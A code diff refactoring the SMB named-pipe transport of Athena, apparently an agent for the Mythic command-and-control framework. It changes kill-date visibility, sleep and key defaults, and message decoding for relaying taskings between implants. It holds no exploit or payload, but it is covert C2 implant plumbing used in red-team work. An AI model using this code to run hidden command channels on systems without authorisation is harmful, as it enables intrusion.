@@ -1,20 +1,23 @@
-﻿using Athena.Models.Mythic.Response;
-using Athena.Utilities;
-using System.Collections.Concurrent;
-using H.Pipes;
-using H.Pipes.Args;
+﻿using Athena.Commands;
 using Athena.Models.Config;
-using System.Diagnostics;
-using System.IO.Pipes;
-using System.Security.Principal;
-using System.Security.AccessControl;
-using H.Pipes.AccessControl;
-using System.Text;
 using Athena.Models.Athena.Commands;
 using Athena.Models.Mythic.Checkin;
-using System.Text.Json;
+using Athena.Models.Mythic.Response;
 using Athena.Models.Mythic.Tasks;
-using Athena.Commands;
+using Athena.Utilities;
+using System.Collections.Concurrent;
+
+using H.Pipes;
+using H.Pipes.Args;
+using H.Pipes.AccessControl;
+
+using System.Diagnostics;
+using System.IO.Pipes;
+using System.Security.AccessControl;
+using System.Security.Principal;
+using System.Text;
+using System.Text.Json;
+
 
 namespace Athena
 {
@@ -24,15 +27,14 @@ namespace Athena
         public string psk { get; set; }
         public string pipeName = "pipename";
         private string checkinResponse { get; set; }
+        public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
         private bool connected { get; set; }
         public bool encrypted { get; set; }
         public bool encryptedExchangeCheck = bool.Parse("false");
-        private DateTime killDate { get; set; }
         private PipeServer<DelegateMessage> serverPipe { get; set; }
         public PSKCrypto crypt { get; set; }
-        //public BlockingCollection<DelegateMessage> queueIn { get; set; }
         private ManualResetEvent onEventHappenedSignal = new ManualResetEvent(false);
         private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
         private CancellationTokenSource cts = new CancellationTokenSource();
@@ -42,16 +44,14 @@ namespace Athena
 
         public Smb()
         {
-            uuid = "%UUID%";
-            this.connected = false;
-            this.psk = "";
             DateTime kd = DateTime.TryParse("killdate", out kd) ? kd : DateTime.MaxValue;
             this.killDate = kd;
-            int sleep = 1; //A 0 sleep causes issues with messaging, so setting it to 1 to help mitigate those issues
-            this.sleep = sleep;
-            int jitter = 0;
-            this.jitter = jitter;
-            //this.queueIn = new BlockingCollection<DelegateMessage>();
+            uuid = "%UUID%";
+            this.connected = false;
+            this.psk = "AESPSK";
+            this.sleep = 0;
+            this.jitter = 0; ;
+
             if (!string.IsNullOrEmpty(this.psk))
             {
                 this.crypt = new PSKCrypto(this.uuid, this.psk);
@@ -104,14 +104,17 @@ namespace Athena
                 }
             }
         }
-
-        private void OnMythicMessageReceived(string message)
+        private async void OnMythicMessageReceived(string message)
         {
             //We have a full message from the Pipe.
             if (this.encrypted)
             {
                 //Decrypt if necessary
                 message = this.crypt.Decrypt(message);
+            }
+            else
+            {
+                message = (await Misc.Base64Decode(message)).Substring(36);
             }
 
             //Check what kind of message we got.
@@ -138,8 +141,7 @@ namespace Athena
                 this.SetTaskingReceived(this, tra);
             }
         }
-
-        public async Task<bool> StopBeacon()
+        public bool StopBeacon()
         {
             cts.Cancel();
             return true;
@@ -157,6 +159,7 @@ namespace Athena
             {
                 string res = this.checkinResponse;
                 this.checkinResponse = String.Empty;
+
                 return JsonSerializer.Deserialize(res, CheckinResponseJsonContext.Default.CheckinResponse);
             }
 
@@ -165,7 +168,7 @@ namespace Athena
                 status = "failed"
             };
         }
-        private async void OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
+        private async Task OnMessageReceive(ConnectionMessageEventArgs<DelegateMessage> args)
         {
             //Event handler for new messages
             try
@@ -214,13 +217,13 @@ namespace Athena
                 Debug.WriteLine($"[{DateTime.Now}] {e}");
             }
         }
-        public async Task OnClientConnection()
+        private async Task OnClientConnection()
         {
             Debug.WriteLine($"[{DateTime.Now}] New Client Connected!");
             onClientConnectedSignal.Set();
             this.connected = true;
         }
-        public async Task OnClientDisconnect()
+        private async Task OnClientDisconnect()
         {
             Debug.WriteLine($"[{DateTime.Now}] Client Disconnected.");
             this.connected = false;
@@ -228,7 +231,7 @@ namespace Athena
             onClientConnectedSignal.Reset();
             this.partialMessages.Clear();
         }
-        public async Task<string> Send(string json)
+        private async Task<string> Send(string json)
         {
             if (!connected)
             {
@@ -287,13 +290,5 @@ namespace Athena
         public string message;
         public int chunks;
         public int chunk;
-    }
-    public class MessageReceivedArgs : EventArgs
-    {
-        public string message { get; set; }
-        public MessageReceivedArgs(string message)
-        {
-            this.message = message;
-        }
     }
 }
